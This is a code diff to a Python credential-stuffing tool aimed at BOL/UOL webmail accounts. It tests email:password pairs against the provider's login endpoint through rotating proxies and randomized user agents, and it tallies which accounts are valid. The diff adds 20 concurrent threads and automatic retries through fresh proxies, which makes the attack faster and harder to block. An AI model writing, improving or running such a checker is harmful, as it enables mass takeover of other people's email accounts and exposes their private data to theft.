@@ -4,7 +4,11 @@
 import requests
 import random
 import time
+import threading
 
+
+MAX_THREADS = 20
+threads = []
 queue = []
 count_checkeds = 0
 count_lives = 0
@@ -61,7 +65,7 @@ def parse_error(body, email, password):
 
 
 def login(email, password, proxy):
-    global count_checkeds, count_dies, count_lives, count_errors
+    global count_checkeds, count_dies, count_lives, count_errors, proxies
     if not email.endswith('bol.com.br'):
         return print("[x] %s %s -> Email provider not supported." % (email, password))
 
@@ -77,14 +81,20 @@ def login(email, password, proxy):
 
     userAgent = random.choice(USER_AGENT_LIST)
 
-    loginPageReq = requests.get(
-        'https://email.bol.uol.com.br/login', proxies=loginRequestProxy, headers={'user-agent': userAgent})
-    loginPageCookies = loginPageReq.cookies.get_dict()
+    try:
+        loginPageReq = requests.get(
+            'https://email.bol.uol.com.br/login', proxies=loginRequestProxy, headers={'user-agent': userAgent})
+        loginPageCookies = loginPageReq.cookies.get_dict()
 
-    loginPayload = "skin=bol-default&dest=WEBMAIL&deviceId=&user=%s&pass=%s" % (
-        formatedEmail, password)
-    loginRequest = requests.post(
-        'https://visitante.acesso.uol.com.br/login.html', proxies=loginRequestProxy, data=loginPayload, headers=LOGIN_REQUEST_HEADERS, cookies=loginPageCookies)
+        loginPayload = "skin=bol-default&dest=WEBMAIL&deviceId=&user=%s&pass=%s" % (
+            formatedEmail, password)
+        loginRequest = requests.post(
+            'https://visitante.acesso.uol.com.br/login.html', proxies=loginRequestProxy, data=loginPayload, headers=LOGIN_REQUEST_HEADERS, cookies=loginPageCookies)
+    except:
+        print("[!] %s %s -> Request error. Retrying..." % (email, password))
+        count_errors = count_errors + 1
+        count_checkeds = count_checkeds + 1
+        return login(email, password, random.choice(proxies))
 
     count_checkeds = count_checkeds + 1
 
@@ -105,22 +115,51 @@ def login(email, password, proxy):
 
 def worker():
     global queue, proxies
-    while len(queue) > 0:
-        proxy = random.choice(proxies)
-        lastAccOfQueue = str(queue.pop()).split(
-            ":")  # get last acc and remove it
-        userEmail = lastAccOfQueue[0]
-        userPassword = lastAccOfQueue[1]
-        login(userEmail, userPassword, proxy)
+    try:
+        while len(queue) > 0:
+            proxy = random.choice(proxies)
+            lastAccOfQueue = str(queue.pop()).split(
+                ":")  # get last acc and remove it
+            userEmail = lastAccOfQueue[0]
+            userPassword = lastAccOfQueue[1]
+            login(userEmail, userPassword, proxy)
+            time.sleep(1.0)
+            pass
+    except KeyboardInterrupt:
+        abort()
+    pass
+
+
+def spawn_threads():
+    while len(threads) < MAX_THREADS:
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        threads.append(t)
         pass
     pass
-    time.sleep(1.0)
+
+
+def start():
+    for thread in threads:
+        thread.start()
+        pass
+
+
+def abort():
+    for thread in threads:
+        thread.join()
+        pass
 
 
 def main():
+    global queue
     load()
-    worker()
-    pass
+    spawn_threads()
+    start()
+
+    while len(queue) > 0:
+        time.sleep(1)
+        pass
 
 
 main()
